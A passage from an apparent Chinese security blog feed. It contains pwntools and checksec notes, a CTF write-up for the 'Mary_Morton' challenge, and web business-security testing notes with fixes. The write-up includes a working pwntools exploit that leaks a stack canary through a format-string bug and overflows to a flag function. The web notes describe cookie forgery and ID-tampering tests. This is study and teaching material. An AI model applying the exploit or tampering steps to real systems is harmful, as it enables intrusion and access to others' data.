contex(arch='amd64',os='linux',log_level='debug')gdb.attach(io)pause() # 对脚本进行调试</code></pre><ul><li>打包数据：p64()或p32() </li><li>解包数据：u64()或u32()</li></ul><p>bin文件操作：</p><pre><code class="hljs">elf=ELF("binfilepath")libc=ELF("libcpath")</code></pre><p>得到程序bss段的起始位置：<code>bss_base_addr=elf.bss()</code></p><ul><li>PLT  <code>write_plt=elf.plt["write"]</code></li><li>GOT  <code>write_plt=elf.got["write"]</code></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn之checksec学习</title>
    <link href="/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！</p><p>checksec主要用于查看题目开启了哪些保护机制。</p><h1 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h1><p>程序架构信息，判断是64位还是32位</p><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>主要针对GOT改写的攻击方式，分为Partial RELRO和Full RELRO。</p><p>Partial RELRO：表示got表可写，容易受到攻击</p><p>Full RELRO：表示got表不可写，只读，无法被覆盖，会增加程序启动时间</p><h1 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h1><p>Canary翻译为金丝雀，应用于在栈保护上是在初始化一个栈帧时在栈底设置一个随机的canary值，当函数返回时监测canary是否改变，以此判断stack/buffer overflow是否发生，改变则说明栈溢出发生，程序走另一个流程结束一面漏洞利用成功，因此我们需要获取canary值或防止出发stack_chk_fall函数。</p><pre><code class="hljs">gcc -fno-stack-protector -o hello test.c   //禁用栈保护gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</code></pre><h1 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h1><p>NX enable 可不执行内存</p><p>最常见方法为ROP,利用栈溢出在栈上布置地址，每个内存地址对应一个gadget，利用ret等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。</p><p>gcc默认开启NX选项。</p><p>这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>位置无关可执行文件，地址空间分布随机化</p><p>与ASLR类似，将程序运行时的对堆栈以及共享库的加载地址随机化，而PIE技术则在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定，在PIE和ASLR同时开启时攻击者将对程序的内存布局一无所知，got表方法也难以进行，无法获取程序.got表的虚地址。</p><pre><code class="hljs">0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><h1 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h1><pre><code class="hljs">RWX： Has RWX segments</code></pre><p>表示可读可写可执行。</p><p>此处贴一个GDB调试技巧<br><a href="https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3" title="GDB调试技巧和exp模板">https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>checksec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-Mary_Morton</title>
    <link href="/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/"/>
    <url>/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/</url>
    
    <content type="html"><![CDATA[<p>9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！</p><h1 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h1><ol><li>file查看文件属性，elf64位文件</li><li>checksec查看保护机制</li></ol><p><img src="https://s2.loli.net/2022/11/08/A87ktmN1Sy5g9QJ.png" alt="image.png"></p><p>64位文件；</p><p>开启了Partial RELRO，表示got表可写；</p><p>开启了NX，栈不可执行；</p><p>无PIE；</p><p>开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数返回之时会检测canary是否改变。</p><p>运行程序</p><p><img src="https://s2.loli.net/2022/11/09/WlYMdrTOVoR5kvD.png" alt="image.png"></p><p>1-栈溢出漏洞；2-格式化字符串漏洞；3-退出</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>IDA打开找到main函数：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)<br>{<br>  int v3; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">24</span>h] [bp-Ch]@<span class="hljs-number">2</span><br>  __int64 v4; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">28</span>h] [bp-<span class="hljs-number">8</span>h]@<span class="hljs-number">1</span><br>  v4 = *MK_FP(__FS__, <span class="hljs-number">40</span>LL);<br>  sub_4009FF();<br>  puts(<span class="hljs-string">"Welcome to the battle ! "</span>);<br>  puts(<span class="hljs-string">"[Great Fairy] level pwned "</span>);<br>  puts(<span class="hljs-string">"Select your weapon "</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      sub_4009DA();<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v3);                <span class="hljs-regexp">//</span> 选择项 <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span><br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_4008EB();                             <span class="hljs-regexp">//</span> printf 格式化字符串<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      puts(<span class="hljs-string">"Bye "</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      sub_400960();                             <span class="hljs-regexp">//</span> 触发canary，含栈溢出<br>    <span class="hljs-keyword">else</span><br>      puts(<span class="hljs-string">"Wrong!"</span>);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>格式化字符串：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 sub<span class="hljs-constructor">_4008EB()</span><br>{<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [sp+0h] [bp-90h]@1</span><br>  __int64 v2; <span class="hljs-comment">// [sp+88h] [bp-8h]@1</span><br>  v2 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 0x28LL)</span>;                  <span class="hljs-comment">// 从位置FS:[0x28u]读取双字内容</span><br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  printf(&amp;buf, &amp;buf);<br>  return *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>栈溢出：</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">__int64 sub_40096<span class="hljs-number">0</span>()<br>{<br>  char buf; <span class="hljs-regexp">//</span> [sp+0h] [bp-<span class="hljs-number">90</span>h]@1<br>  __int64 v2; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">88</span>h] [bp-<span class="hljs-number">8</span>h]@1<br>  v2 = *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">0x28</span>LL);                  <span class="hljs-regexp">//</span> canary标志<br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);                      <span class="hljs-regexp">//</span> 栈溢出<br>  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"-&gt; %s\n"</span>, &amp;buf);<br>  <span class="hljs-keyword">return</span> *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">40</span>LL) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>查看流程图：</p><p><img src="https://s2.loli.net/2022/11/09/tFhGesgyKAc3CYm.png" alt="image.png"></p><p>分析可知<code>v2 = *MK_FP(__FS__, 0x28LL);</code>有canary保护，只有rax与fs:28h相等，才能跳转到返回值，反之则调用<code>stak_chk_fail</code></p><p>查看字符串发现有 cat flag:</p><p><img src="https://s2.loli.net/2022/11/09/ftOmIBaWVwlAzcN.png" alt="image.png"></p><p>地址：<code>0x4008DA</code></p><p>思路：</p><p>利用字符串漏洞泄露canary值，在函数返回的时候再填回去，然后利用栈溢出让其返回后门函数。</p><p>（我的IDA不知道为什么解析不出来这个函数体，不过应该问题不大）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先测一下字符串漏洞的偏移，payload一般为：</p><pre><code class="hljs">AAAA-%x-%x-%x-%x…</code></pre><p><img src="https://s2.loli.net/2022/11/09/fhgGbe9mZs5oNI4.png" alt="image.png"></p><p>偏移了6个字节。</p><p>canary与输入参数之间的偏移：</p><p><img src="https://s2.loli.net/2022/11/09/sDH8EhMNtwgQB29.png" alt="image.png"></p><p>计算泄露特定地址的payload一般构造为</p><pre><code class="hljs">(target_addr - start_addr + offset) / address_bytes_length（64位为8，32位为4）</code></pre><p>buf和v2相差： 0x90-0x8=0x88,0x88/8=17,17+6=23</p><ul><li>64位程序，一个字符占8字节（32位是4字节），所以buf和v2相差0x88，转十进制为136，除以8，即相差17个字节</li><li>由于buf是格式化字符串的第6个参数，所以v2是格式化字符串的第17+6=23个参数。</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-comment"># 导入pwn模块</span><br>p=remote(<span class="hljs-string">'61.147.171.105'</span>,<span class="hljs-number">53266</span>)<br> <span class="hljs-comment"># 远程交互</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'2'</span>)<br> <span class="hljs-comment"># 在接收到`3. Exit`后输入2进入格式化字符串漏洞环节</span><br>p.sendline(<span class="hljs-string">'%23$p'</span>)<br> <span class="hljs-comment"># 发送%23$p,让程序输出canary的值 (不明白为什么23位是这样写的)</span><br>p.recvuntil(<span class="hljs-string">'0x'</span>)<br> <span class="hljs-comment"># 读到0x出现为止</span><br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br> <span class="hljs-comment"># canary接收整型16字节数</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">"canary:  "</span> + <span class="hljs-built_in">hex</span>(canary)<br> <span class="hljs-comment"># canary转十六进制</span><br>flag_addr=<span class="hljs-number">0x4008da</span><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>+p64(flag_addr)<br> <span class="hljs-comment"># 用a填充相差的0x88，跟上第23位的canary值，加上flag地址，最后64位对其填上a*8</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'1'</span>)<br> <span class="hljs-comment"># 读到3.Exit之后输入1 进入栈溢出环节</span><br>p.sendline(payload)<br> <span class="hljs-comment"># 发送payload</span><br>p.interactive()<br> <span class="hljs-comment"># 结束交互</span><br></code></pre></td></tr></tbody></table></figure><p>（题目描述说是非常简单的热身pwn，呵呵）</p><h1 id="拓展：canary"><a href="#拓展：canary" class="headerlink" title="拓展：canary"></a>拓展：canary</h1><p>对于64位程序，在开始运行时，就会随机生成canary，存放在 TLS结构体 tcbhead_t 偏移为 0x28 的位置，带有缓冲区的函数在函数开头就会利于 FS指针 从该位置取出canary的值将其置于 rbp-0x8 的位置，在函数返回时，就会比较 FS[0x28] 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— stack_chk_fail,它会让程序终止并且抛出报错 “stack smahing detected”</p><h1 id="拓展：格式化字符串漏洞"><a href="#拓展：格式化字符串漏洞" class="headerlink" title="拓展：格式化字符串漏洞"></a>拓展：格式化字符串漏洞</h1><p>虽然之前有写过笔记，但是忘记了，所以再记录一遍。</p><p>在C语言中的printf,fprintf,sprintf,snprintf等print函数等用到类似<code>%</code>形式的一个或多个说明符，例如<code>printf("I am %s",lihua);</code></p><p>第一个参数就是格式化字符串，它主要依靠一个可以用来告诉程序如何进行格式化输出的说明符。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理就是程序员偷懒将格式化字符串操作全交给了用户，产生任意地址读写的漏洞。</p><p>正确的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf("%s",str);</code></pre><p>有漏洞的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf(str);</code></pre><p>因为printf函数是可变参数的函数，如果用户输入参数位<code>%x</code>，那么就会输出内存中的数据，因为没有指定参数个数，没有限制输出类型，所以程序遇到<code>%</code>就会根据相应的规则去取相应的参数，直到检索到格式化字符串结束，造成内存泄露。</p>]]></content>
    
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
      <tag>攻防世界</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web攻防业务安全实战指南笔记</title>
    <link href="/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/"/>
    <url>/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<p>业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。</p><p>业务风险点识别应主要关注以下安全风险内容：</p><ol><li>业务环节存在的安全风险：业务环节存在的安全风险指的是业务使用者课件的业务存在的安全风险，如注册、登录和密码找回等身份认真环节，是否存在完善的验证码机制、数据一致性校验机制、Session和Cookie校验机制等，是否能规避验证码绕过、暴力破解和Sql注入等漏洞。</li><li>支持系统存在的安全风险：支持系统存在的安全风险，如用户访问控制机制是否完善，是否存在水平越权或垂直越权漏洞。系统内加密存储机制是否完善，业务数据是否明文传输，系统使用的业务接口是否可以未授权访问/调用，是否可以调用重放、遍历，接口调用参数是否可篡改等。</li><li>业务环节间存在的安全风险：业务环节间存在的安全风险，如系统业务流程是否存在乱序，导致某个业务环节可绕过、回退，或某个业务请求可以无限重放。业务环节间传输的数据是否有一致性校验机制，是否存在业务数据可被篡改的风险。</li><li>支持系统间存在的安全风险：支持系统间存在的安全风险，如系统间数据传输是否加密、系统间传输的参数是否可篡改。系统间输入参数的过滤机制是否完善，是否可能导致sql注入、xss跨站脚本和代码执行漏洞。</li><li>业务环节与支持系统间存在的安全风险：业务环节与支持系统间存在的风险，如数据传输是否加密、加密方式是否完善，是否采用前端加密、简单md5编码等不安全的加密方式。系统处理多线程并发请求的机制是否完善，服务端逻辑与数据库读写是否存在时序问题，导致竞争条件漏洞，系统间输入参数的过滤机制是否完善。</li></ol><h1 id="技术篇"><a href="#技术篇" class="headerlink" title="技术篇"></a>技术篇</h1><h2 id="登录认证模块测试"><a href="#登录认证模块测试" class="headerlink" title="登录认证模块测试"></a>登录认证模块测试</h2><h3 id="暴力破解测试"><a href="#暴力破解测试" class="headerlink" title="暴力破解测试"></a>暴力破解测试</h3><p>暴力破解测试是指针对应用系统用户登录账号与密码进行的穷举测试，针对账号或密码进行逐一比较，直到找出正确的账号密码。</p><ul><li>在已知账号的情况下，加载密码字典针对密码进行穷举测试；</li><li>在未知账号的情况下，加载账号字典，并结合密码字典进行穷举测试。</li><li>在未知账号和密码的情况下，利用账号字典和密码字典进行穷举测试。</li></ul><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p>使用手工或工具对系统登录认证的账号及密码进行穷举访问测试，根据系统返回的数据信息来判别账号及密码是否正确。</p><ol><li>对浏览器进行http代理配置，将浏览器访问请求指向bp工具默认的监听端口。</li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>增加验证码，登录失败一次，验证码变换一次。</li><li>配置登录失败次数限制策略，如在同一用户尝试登录的情况下，5分钟内连续登录失败超过6次，则禁止此用户在3小时内登录系统。</li><li>在条件允许的情况下，增加手机接收短信验证码或邮箱接收邮件验证码，实现双因素认证的防暴力破解机制。</li></ol><p>##本地加密传输测试<br>本机加密传输测试是针对客户端与服务器的数据传输，查看数据是否采用ssl加密方式加密。<br>###测试过程<br>测试验证客户端与服务器交互数据在网络传输过程中是否采用ssl进行加密处理，加密数据是否可被破解。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>在架设web应用的服务器上部署有效的ssl证书服务</p><h2 id="Session测试"><a href="#Session测试" class="headerlink" title="Session测试"></a>Session测试</h2><h3 id="测试原理和方法"><a href="#测试原理和方法" class="headerlink" title="测试原理和方法"></a>测试原理和方法</h3><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户退出应用系统时，应将客户端Session认证属性标识清空。如果未能清空客户端Session标识，在下次登录系统时，系统会重复利用该Session标识进行认证会话。攻击者可利用该漏洞生成固定Session会话，并诱骗用户利用攻击者生成的固定会话进行系统登录，从而导致用户会话认证被窃取。</p><h3 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h3><p>在注销退出系统时，对当前浏览器授权SessionID值进行记录，再次登录系统，将本次授权SessionID值与上次进行比对校验。判断服务器是否与上次相同的SessionID值进行授权认证，若使用相同SessionID值则存在固定会话风险。</p><ul><li>在已登录授权认证的页面中退出系统</li><li>使用bp截取退出系统的请求数据，记录本次授权的SessionID</li><li>重新登录系统，bp截取登录授权请求数据，与上次的SessionID值比较判断是否相同</li></ul><h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>在客户端登录系统时，应首先判断客户端是否提交浏览器的留存Session认证会话属性标识，客户端提交此信息至服务器时，应及时销毁浏览器留存的Session认证会话，并要求客户端浏览器重新生成Session认证会话属性标识。</p><h2 id="Session会话注销测试"><a href="#Session会话注销测试" class="headerlink" title="Session会话注销测试"></a>Session会话注销测试</h2><p>Session是应用系统对浏览器客户端身份认证的属性标识，在用户注销或退出应用系统时，系统应将客户端Session认证属性标识清空，如果未能清空Session认证会话，该认证会话，将持续有效，此时攻击者获得该Session认证会话会导致用户权限被盗取。</p><h3 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h3><p>用户退出系统授权后，判断授权认证SessionID值是否依然有效，若授权认证SessionID依然有效则存在风险。</p><ul><li>对已登录授权的系统页面使用Bp进行截取，保存SessionID值</li><li>将数据包发送到Repeater模块中</li><li>在已授权的页面中退出系统。</li><li>重发数据包，并查看系统是否对推出后得到用户授权Session今年解除授权。</li></ul><h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>在用户注销或退出应用系统时，服务器应及时销毁Session认证会话信息并清空客户端浏览器Session属性标识。</p><h2 id="Session会话超时事件测试"><a href="#Session会话超时事件测试" class="headerlink" title="Session会话超时事件测试"></a>Session会话超时事件测试</h2><p>在用户成功登录系统获得Session认证会话，该Session认证会话应具有生命周期，即用户在成功登录系统后，在固定时间内该用户与服务器无任何交互操作，应销毁该用户Session认证会话信息，要求用户重新登录系统认证。</p><h3 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统会话授权认证时长进行测试，并根据系统承载的业务需求来分析判断当前系统会话授权认证时间是否过长。</p><ul><li>对已登录授权的系统页面使用bp工具进行请求数据截取，将数据包中Session认证参数值进行保存记录。</li><li>发送到Repeater中，三十分钟后重发，看能否继续查阅信息</li></ul><h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>对每个生成的Session认证会话配置生命周期，从而有效降低因用户会话认证时间过长而导致的信息泄露风险。</p><h2 id="Cookie仿冒测试"><a href="#Cookie仿冒测试" class="headerlink" title="Cookie仿冒测试"></a>Cookie仿冒测试</h2><p>服务器为鉴别客户端浏览器会话及身份信息，会将用户身份信息存储在cookie中，并发送至客户端存储。攻击者通过尝试修改cookie中的身份标识，从而达到仿冒其他用户身份的目的，并拥有相关用户的所有权限。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>对系统会话授权认证cookie中会话身份认证标识进行篡改测试，通过篡改身份认证标识值来判断能否改变用户身份会话。</p><ul><li>使用李雷账号登录系统并进行浏览器页面刷新</li><li>使用bp对本次页面刷新请求数据进行截取，并将请求数据cookie中的userid值修改为admin进行提交。</li><li>查看提交后的返回信息，账号身份授权被修改成管理员</li></ul><h3 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议对客户端标识的用户敏感信息数据，使用Session会话认证方式，避免被他人仿冒身份</p><h2 id="密文比对认证测试"><a href="#密文比对认证测试" class="headerlink" title="密文比对认证测试"></a>密文比对认证测试</h2><p>在系统登录时密码加密流程一般是先将用户名和密码发送到服务器，服务器会把用户提交的密码经过hash算法加密后和数据库中存储的加密值比对，如果加密值相同，则判定用户提交密码正确。</p><p>但有些网站系统的流程是在前台浏览器客户端对密码进行hash加密后传输给服务器并与数据库加密值进行对比，如果加密值相同，则判定用户提交密码正确，此流程会泄露密码加密方式导致出现安全隐患。</p><h3 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h3><p>对系统敏感数据加密流程进行测试，判断加密过程或方式是否为客户端加密方式。</p><ul><li>bp抓包，根据页面代码分析后证实登录传输口令使用Hash MD5加密算法加密<ul><li>bp抓包，查看web系统登录提交密码为加密后的密文传输</li><li>通过对页面代码分析得出web系统登录口令加密处理过程是由本地js脚本来完成，方式为md5。</li></ul></li><li>用bp爆破，添加配置项payloadProcessing，将要破解的密码值进行数据处理转换。</li></ul><h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>将密码加密过程及密文比对过程防止在服务器后台执行，发送用户名和密码到服务器后台，后台对用户提交的密码经过md5算法加密后和数据库中存储的md5密码值进行比对，如果加密值相同，则允许用户登录</p><h2 id="登录失败信息测试"><a href="#登录失败信息测试" class="headerlink" title="登录失败信息测试"></a>登录失败信息测试</h2><p>在用户登录系统失败时，系统会在页面显示用户登录失败信息，若提交账号在系统中不存在，系统提示“用户名不存”、“账号不存在”等明确信息，假如提交账号在系统中存在，则系统提示“密码错误”等间接提示信息，攻击者可根据此类登录失败提示信息来判断当前登录账号是否在系统中存在，从而进行有针对性的暴力破解口令测试</p><h3 id="修复建议-7"><a href="#修复建议-7" class="headerlink" title="修复建议"></a>修复建议</h3><p>对系统登录失败提示语句表达内容进行统一的模糊描述，从而提高攻击者对登录系统用户名及密码的可猜测难度。</p><h1 id="业务办理模块测试"><a href="#业务办理模块测试" class="headerlink" title="业务办理模块测试"></a>业务办理模块测试</h1><h2 id="订单ID篡改测试"><a href="#订单ID篡改测试" class="headerlink" title="订单ID篡改测试"></a>订单ID篡改测试</h2><p>开发人员没考虑登录后用户间权限间隔问题，就会导致水平越权。</p><h3 id="测试过程-5"><a href="#测试过程-5" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录李先生账号，查看本人保单，抓包修改保单号，即可越权查看他人保单内容。</p><p>在返回的数据包中，包含全部在界面中被隐藏的身份证号等敏感信息。</p><h3 id="修复建议-8"><a href="#修复建议-8" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台查看订单时要通过Session机制判断用户身份，做好平行权限控制，服务端需要校验相应订单是否和登录者身份一致，防止水平越权泄露用户敏感个人信息。</p><h2 id="手机号码篡改测试"><a href="#手机号码篡改测试" class="headerlink" title="手机号码篡改测试"></a>手机号码篡改测试</h2><p>手机号通常可以代表一个用户身份，当请求中发现有手机号参数时，我们可以试着修改它，测试是否存在越权漏洞，系统登录功能一般先判断用户名和密码是否正确，通过Session机制赋予用户令牌，但是在登录后的某些操作某些功能时，抓包或通过其他方式尝试篡改手机号，即可对此类问题进行测试。</p><h3 id="测试过程-6"><a href="#测试过程-6" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录后在操作某些功能时抓包，篡改手机号进行测试。</p><ul><li>以尾号0136手机号登录，选择挂失业务。</li><li>抓包修改手机号为另一个手机号尾号9793</li><li>手机号码参数篡改成功，成功挂失尾号9793</li></ul><h3 id="修复建议-9"><a href="#修复建议-9" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台请求要通过Session机制判断用户身份，如果需要客户端传输手机号码，则服务端需要校验手机号是否和登录者的身份一致，如发现不一致则拒绝将请求，防止水平越权，对于手机app程序，不要过于相信从手机中直接读取的手机号码，要做常规的身份认证，规范登录流程防止未授权登录</p><h2 id="用户ID篡改测试（水平越权）"><a href="#用户ID篡改测试（水平越权）" class="headerlink" title="用户ID篡改测试（水平越权）"></a>用户ID篡改测试（水平越权）</h2><p>从开发角度，用户登录后查看个人信息时，需要通过sessionid判定用户身份，然后显示相应用户的个人信息，但有时我们发现在get或post请求中有userid这类参数传输，并且后台通过此参数显示对应用户隐私信息，这就导致攻击者可以通过篡改用户Id越权访问其他用户隐私信息。</p><h3 id="测试过程-7"><a href="#测试过程-7" class="headerlink" title="测试过程"></a>测试过程</h3><p>登录，点击收货地址修改，抓包，发现关键参数deliverID，修改为其他，提交后返回非本账户的联系人相关信息</p><h3 id="修复建议-10"><a href="#修复建议-10" class="headerlink" title="修复建议"></a>修复建议</h3><p>后台功能请求要通过Session机制判断用户身份，不要相信客户端传来的用户ID,如果确实需要客户端传输userid，则服务端需要校验userid是否和登录者的Session身份一致，防止被攻击者篡改，未授权访问他人账号内容</p><h2 id="邮箱和用户篡改测试（水平越权）"><a href="#邮箱和用户篡改测试（水平越权）" class="headerlink" title="邮箱和用户篡改测试（水平越权）"></a>邮箱和用户篡改测试（水平越权）</h2><p>在发送邮件或站内消息时，篡改其中的发件人参数，导致攻击者可以伪造发信人进行钓鱼攻击等操作，用户登录成功后拥有发信权限，开发者就信任了客户端传来的发件人参数，导致业务安全问题出现。</p><h3 id="测试过程-8"><a href="#测试过程-8" class="headerlink" title="测试过程"></a>测试过程</h3><p>编写邮件点击发送，bp抓包，修改发件人参数inputFron，并提交发送邮件，收件时，发现发件人被篡改成功。</p><h3 id="修复建议-11"><a href="#修复建议-11" class="headerlink" 